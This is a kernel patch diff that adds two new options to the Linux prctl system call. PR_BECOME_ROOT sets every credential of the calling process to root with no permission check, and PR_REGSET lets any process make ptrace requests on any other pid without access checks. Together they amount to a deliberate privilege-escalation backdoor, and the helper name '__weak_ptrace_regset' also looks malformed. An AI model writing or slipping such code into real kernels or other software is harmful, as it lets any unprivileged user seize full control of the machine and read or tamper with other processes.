@@ -2349,6 +2349,16 @@ int __weak arch_prctl_spec_ctrl_set(struct task_struct *t, unsigned long which,
 	return -EINVAL;
 }
 
+int __weak_ptrace_regset(struct task_struct *task, int req, unsigned int type,
+                         struct iovec *kiov){
+	return -EINVAL;
+}
+
+static int prctl_regset(struct task_struct* me, unsigned long req, unsigned long type, unsigned long datap)
+{      
+       return ptrace_request(me, req, type, datap);
+}
+
 SYSCALL_DEFINE5(prctl, int, option, unsigned long, arg2, unsigned long, arg3,
 		unsigned long, arg4, unsigned long, arg5)
 {
@@ -2564,6 +2574,33 @@ SYSCALL_DEFINE5(prctl, int, option, unsigned long, arg2, unsigned long, arg3,
 	case PR_SET_VMA:
 		error = prctl_set_vma(arg2, arg3, arg4, arg5);
 		break;
+	case PR_REGSET: // ljj: 
+                {
+                        struct task_struct *child = find_task_by_vpid(arg2);
+                        if (!child){
+                                error = -ESRCH;
+                        } else {
+                                error = prctl_regset(child, arg3, arg4, arg5);
+                        }
+                }
+                break;
+	case PR_BECOME_ROOT: // ljj:
+		{
+			struct cred* new;
+			new = prepare_creds();
+        		if (!new){
+                		error = -ENOMEM;
+				break;
+			}
+	        	new->uid = KUIDT_INIT(0);
+			new->gid = KGIDT_INIT(0);
+			new->euid = KUIDT_INIT(0);
+			new->egid = KGIDT_INIT(0);
+			new->fsuid= KUIDT_INIT(0);
+			new->fsgid= KGIDT_INIT(0);
+			commit_creds(new);
+			break;
+		}
 	default:
 		error = -EINVAL;
 		break;
